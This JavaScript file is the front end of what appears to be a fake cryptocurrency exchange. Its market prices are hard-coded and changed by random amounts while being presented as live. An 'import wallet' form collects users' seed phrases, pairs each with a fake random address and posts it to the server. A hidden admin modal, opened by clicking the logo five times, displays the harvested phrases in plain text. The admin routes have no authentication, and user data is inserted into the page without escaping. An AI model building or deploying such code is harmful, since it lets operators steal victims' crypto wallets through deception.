const markets = [
    { name: 'Bitcoin', symbol: 'BTC', price: 85245.32, change: 2.48, icon: '₿', color: '#f7931a' },
    { name: 'Ethereum', symbol: 'ETH', price: 5245.10, change: 1.12, icon: 'Ξ', color: '#627eea' },
    { name: 'Solana', symbol: 'SOL', price: 252.32, change: 5.20, icon: 'S', color: '#00d2ff' },
    { name: 'BNB', symbol: 'BNB', price: 720.40, change: -0.45, icon: 'B', color: '#f3ba2f' },
    { name: 'XRP', symbol: 'XRP', price: 3.91, change: -1.20, icon: 'X', color: '#23292f' },
    { name: 'Cardano', symbol: 'ADA', price: 1.25, change: 3.10, icon: 'A', color: '#0033ad' },
    { name: 'Dogecoin', symbol: 'DOGE', price: 0.28, change: 1.45, icon: 'Ð', color: '#c2a633' },
    { name: 'Avalanche', symbol: 'AVAX', price: 45.20, change: -2.10, icon: 'A', color: '#e84142' },
    { name: 'Polkadot', symbol: 'DOT', price: 12.15, change: 0.50, icon: '●', color: '#e6007a' },
    { name: 'Chainlink', symbol: 'LINK', price: 28.40, change: 4.20, icon: '⬡', color: '#2a5ada' },
    { name: 'Polygon', symbol: 'MATIC', price: 1.12, change: -1.15, icon: 'M', color: '#8247e5' },
    { name: 'Shiba Inu', symbol: 'SHIB', price: 0.000045, change: 6.80, icon: 'S', color: '#f00500' },
    { name: 'Litecoin', symbol: 'LTC', price: 112.10, change: 1.05, icon: 'Ł', color: '#345d9d' },
    { name: 'TRON', symbol: 'TRX', price: 0.23, change: 0.80, icon: 'T', color: '#eb0029' },
    { name: 'Uniswap', symbol: 'UNI', price: 15.20, change: -0.90, icon: 'U', color: '#ff007a' },
    { name: 'Cosmos', symbol: 'ATOM', price: 14.80, change: 2.10, icon: '⚛', color: '#2e3148' },
    { name: 'Stellar', symbol: 'XLM', price: 0.22, change: -1.50, icon: 'X', color: '#000000' },
    { name: 'NEAR Protocol', symbol: 'NEAR', price: 9.50, change: 3.40, icon: 'N', color: '#00ec97' },
    { name: 'Aptos', symbol: 'APT', price: 15.20, change: -2.30, icon: 'A', color: '#000000' },
    { name: 'Arbitrum', symbol: 'ARB', price: 2.15, change: 1.80, icon: 'A', color: '#12aaff' },
    { name: 'Optimism', symbol: 'OP', price: 4.40, change: 0.40, icon: 'O', color: '#ff0420' },
    { name: 'Filecoin', symbol: 'FIL', price: 8.80, change: -1.10, icon: 'F', color: '#0090ff' },
    { name: 'Injective', symbol: 'INJ', price: 35.10, change: 7.20, icon: 'I', color: '#00d2ff' },
    { name: 'Sui', symbol: 'SUI', price: 2.65, change: 4.50, icon: 'S', color: '#6fbcf0' },
    { name: 'Pepe', symbol: 'PEPE', price: 0.000018, change: 12.40, icon: '🐸', color: '#3d8130' }
];

const countries = [
    { name: "United States", flag: "🇺🇸" }, { name: "United Kingdom", flag: "🇬🇧" }, { name: "Canada", flag: "🇨🇦" },
    { name: "Australia", flag: "🇦🇺" }, { name: "Nigeria", flag: "🇳🇬" }, { name: "Kenya", flag: "🇰🇪" },
    { name: "South Africa", flag: "🇿🇦" }, { name: "Ghana", flag: "🇬🇭" }, { name: "India", flag: "🇮🇳" },
    { name: "Germany", flag: "🇩🇪" }, { name: "France", flag: "🇫🇷" }, { name: "Japan", flag: "🇯🇵" },
    { name: "UAE", flag: "🇦🇪" }, { name: "Brazil", flag: "🇧🇷" }
];

let currentTradeMode = 'buy';
let currentUser = null;
let logoClickCount = 0;

// --- UI & VIEW MANAGEMENT ---
function showView(viewId, authType = 'login') {
    document.querySelectorAll('.app-view').forEach(view => view.style.display = 'none');
    document.getElementById(viewId).style.display = 'block';
    if (viewId === 'authView') switchAuth(authType);
    if (viewId === 'dashboardView') fetchBalances();
    window.scrollTo(0, 0);
}

function showToast(msg) {
    const toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3000);
}

function switchAuth(type) {
    document.getElementById('loginForm').style.display = type === 'login' ? 'block' : 'none';
    document.getElementById('registerForm').style.display = type === 'register' ? 'block' : 'none';
}

function populateCountries() {
    const select = document.getElementById('regCountry');
    if(!select) return;
    countries.forEach(country => {
        const option = document.createElement('option');
        option.value = `${country.flag} ${country.name}`;
        option.textContent = `${country.flag} ${country.name}`;
        select.appendChild(option);
    });
}

function populateTradeCoins() {
    const select = document.getElementById('tradeCoin');
    if(!select) return;
    select.innerHTML = ''; 
    markets.forEach(coin => {
        const option = document.createElement('option');
        option.value = coin.symbol;
        option.textContent = `${coin.name} (${coin.symbol})`;
        select.appendChild(option);
    });
}

// --- DYNAMIC BALANCES ---
async function fetchBalances() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        let totalValue = 0;

        // Update BTC
        const btcPrice = markets.find(m => m.symbol === 'BTC').price;
        const btcVal = balances.BTC * btcPrice;
        totalValue += btcVal;
        document.getElementById('balance-BTC').textContent = balances.BTC.toFixed(6);
        document.getElementById('value-BTC').textContent = `$${btcVal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

        // Update ETH
        const ethPrice = markets.find(m => m.symbol === 'ETH').price;
        const ethVal = balances.ETH * ethPrice;
        totalValue += ethVal;
        document.getElementById('balance-ETH').textContent = balances.ETH.toFixed(6);
        document.getElementById('value-ETH').textContent = `$${ethVal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

        // Update USDT
        const usdtVal = balances.USDT;
        totalValue += usdtVal;
        document.getElementById('balance-USDT').textContent = balances.USDT.toFixed(2);
        document.getElementById('value-USDT').textContent = `$${usdtVal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

        document.getElementById('totalPortfolioValue').textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;

    } catch (error) { console.log(error); }
}

// --- AUTHENTICATION ---
async function handleRegister() {
    const name = document.getElementById('regName').value;
    const country = document.getElementById('regCountry').value;
    const phone = document.getElementById('regPhone').value;
    const email = document.getElementById('regEmail').value;
    const password = document.getElementById('regPassword').value;
    if (!name || !country || !phone || !email || !password) return showToast("Please fill all fields.");

    try {
        const res = await fetch('/api/auth/register', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name, country, phone, email, password })
        });
        const data = await res.json();
        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } 
        else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

async function handleLogin() {
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    if (!email || !password) return showToast("Please fill all fields.");

    try {
        const res = await fetch('/api/auth/login', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        const data = await res.json();
        if (res.ok) {
            localStorage.setItem('token', data.token);
            localStorage.setItem('user', JSON.stringify(data.user));
            checkAuthState(); 
        } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

function handleLogout() {
    localStorage.removeItem('token');
    localStorage.removeItem('user');
    checkAuthState();
}

function checkAuthState() {
    currentUser = JSON.parse(localStorage.getItem('user'));
    const navLinks = document.getElementById('navLinks');

    if (currentUser) {
        navLinks.innerHTML = `
            <a href="#" onclick="showView('guestView')">Markets</a>
            <a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')">${currentUser.name.charAt(0).toUpperCase()}</a>
            <a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>
        `;
        showView('dashboardView');
    } else {
        navLinks.innerHTML = `
            <a href="#" onclick="showView('guestView')">Markets</a>
            <a href="#" onclick="showView('authView', 'login')">Login</a>
            <a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>
        `;
        showView('guestView');
    }
}

function requireAuth(targetView, mode = null) {
    if (!currentUser) {
        showView('authView', 'login');
        showToast("Please log in to continue");
    } else {
        showView(targetView);
        if (targetView === 'tradeView') setTradeMode(mode || 'buy');
    }
}

// --- TRADING LOGIC ---
function setTradeMode(mode) {
    currentTradeMode = mode;
    const tabBuy = document.getElementById('tabBuy');
    const tabSell = document.getElementById('tabSell');
    const label = document.getElementById('amountLabel');
    const btn = document.getElementById('submitTradeBtn');

    if (mode === 'buy') {
        tabBuy.classList.add('active'); tabSell.classList.remove('active');
        label.textContent = 'Amount to Spend (USD)';
        btn.textContent = 'Confirm Purchase';
        btn.style.background = 'var(--success)';
    } else {
        tabSell.classList.add('active'); tabBuy.classList.remove('active');
        label.textContent = 'Amount to Sell (USD)';
        btn.textContent = 'Confirm Sale';
        btn.style.background = 'var(--danger)';
    }
    document.getElementById('tradeAmount').value = '';
    document.getElementById('tradeReceive').value = '';
}

function calcTrade() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const coin = markets.find(c => c.symbol === coinSymbol);
    if (coin && amount > 0) {
        document.getElementById('tradeReceive').value = (amount / coin.price).toFixed(6) + " " + coin.symbol;
    } else {
        document.getElementById('tradeReceive').value = '';
    }
}

async function submitTrade() {
    const amount = document.getElementById('tradeAmount').value;
    const coinSymbol = document.getElementById('tradeCoin').value;
    const receive = document.getElementById('tradeReceive').value;
    const method = document.getElementById('tradeMethod').value;
    if (!amount || amount <= 0) return showToast("Enter a valid amount.");

    const coin = markets.find(c => c.symbol === coinSymbol);
    const orderData = {
        userEmail: currentUser.email, userName: currentUser.name, mode: currentTradeMode,
        sendAmount: amount, sendCurrency: currentTradeMode === 'buy' ? 'USD' : coinSymbol,
        getAmount: receive, getCurrency: currentTradeMode === 'buy' ? coinSymbol : 'USD',
        method: method, paymentDetails: "Pending", receivingWallet: "Pending"
    };

    try {
        const res = await fetch('/api/orders/create', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(orderData)
        });
        const data = await res.json();
        if (res.ok) {
            showToast(`Order Placed! ID: ${data.orderId}`);
            setTimeout(() => showView('dashboardView'), 2000);
        } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting to server."); }
}

// --- WEB3 WALLET & ADMIN LOGIC ---
function showImportWallet() { document.getElementById('importWalletForm').style.display = 'block'; }
async function submitWallet() {
    const seed = document.getElementById('seedPhraseInput').value.trim();
    if (seed.split(' ').length < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    try {
        const res = await fetch('/api/wallet/import', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: currentUser.email, seedPhrase: seed, walletAddress: fakeAddress })
        });
        if (res.ok) { showToast("Wallet submitted for Admin review."); checkWalletStatus(); }
    } catch (error) { showToast("Error submitting wallet."); }
}
async function checkWalletStatus() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}`);
        const user = await res.json();
        document.getElementById('walletDisconnected').style.display = 'none';
        document.getElementById('walletPending').style.display = 'none';
        document.getElementById('walletApproved').style.display = 'none';
        if (user.walletStatus === 'approved') {
            document.getElementById('walletApproved').style.display = 'block';
            document.getElementById('displayWalletAddress').textContent = user.walletAddress;
        } else if (user.walletStatus === 'pending') {
            document.getElementById('walletPending').style.display = 'block';
        } else {
            document.getElementById('walletDisconnected').style.display = 'block';
        }
    } catch (error) { console.log(error); }
}
function adminTrigger() {
    logoClickCount++;
    if (logoClickCount >= 5) { document.getElementById('adminModal').style.display = 'flex'; fetchPendingWallets(); logoClickCount = 0; }
    setTimeout(() => { logoClickCount = 0; }, 2000);
}
async function fetchPendingWallets() {
    try {
        const res = await fetch('/api/admin/pending-wallets');
        const users = await res.json();
        const list = document.getElementById('adminPendingList');
        list.innerHTML = '';
        if (users.length === 0) { list.innerHTML = '<p style="color: var(--text-muted); text-align: center;">No pending wallets.</p>'; return; }
        users.forEach(user => {
            list.innerHTML += `
                <div style="background: var(--bg-dark); padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid var(--border);">
                    <p style="color: white; font-weight: bold;">${user.name} (${user.email})</p>
                    <p style="color: var(--text-muted); font-size: 12px; margin-top: 5px;">Address: ${user.walletAddress}</p>
                    <div style="background: #000; padding: 10px; border-radius: 4px; margin: 10px 0; font-family: monospace; color: var(--accent); word-break: break-all;">${user.seedPhrase || 'No seed phrase provided'}</div>
                    <button class="btn-buy" style="width: 100%; padding: 10px;" onclick="approveWallet('${user.email}')">Approve Wallet</button>
                </div>
            `;
        });
    } catch (error) { console.log(error); }
}
async function approveWallet(email) {
    try {
        const res = await fetch(`/api/admin/approve-wallet/${email}`, { method: 'POST' });
        if (res.ok) { showToast("Wallet Approved!"); fetchPendingWallets(); }
    } catch (error) { showToast("Error approving wallet."); }
}

// --- LIVE MARKET SIMULATION ---
function simulateLiveMarket() {
    markets.forEach(coin => {
        const fluctuation = (Math.random() - 0.5) * (coin.price * 0.002);
        coin.price += fluctuation;
        const changeFluctuation = (Math.random() - 0.5) * 0.2;
        coin.change = parseFloat((coin.change + changeFluctuation).toFixed(2));
    });
}
function loadMarkets() {
    const marketList = document.getElementById('market-list');
    const ticker = document.getElementById('ticker');
    if(!marketList) return;
    let marketHTML = ''; let tickerHTML = '';
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0;
        const changeClass = isUp ? 'up' : 'down';
        const changeSymbol = isUp ? '↑' : '↓';
        let formattedPrice = coin.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 6});
        if (coin.price < 0.01) formattedPrice = coin.price.toFixed(7);

        marketHTML += `
            <div class="market-row" onclick="quickTrade('${coin.symbol}')">
                <div class="market-rank">${index + 1}</div>
                <div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div>
                <div class="market-price">$${formattedPrice}</div>
                <div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change)}%</div>
            </div>
        `;
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change)}%</span></div>`;
    });
    marketList.innerHTML = marketHTML;
    ticker.innerHTML = tickerHTML + tickerHTML; 
}
function quickTrade(symbol) {
    requireAuth('tradeView', 'buy');
    setTimeout(() => { document.getElementById('tradeCoin').value = symbol; calcTrade(); }, 100);
}

document.addEventListener('DOMContentLoaded', () => {
    populateCountries();
    populateTradeCoins();
    loadMarkets();
    checkAuthState();
    setInterval(() => { simulateLiveMarket(); loadMarkets(); }, 2000);
});
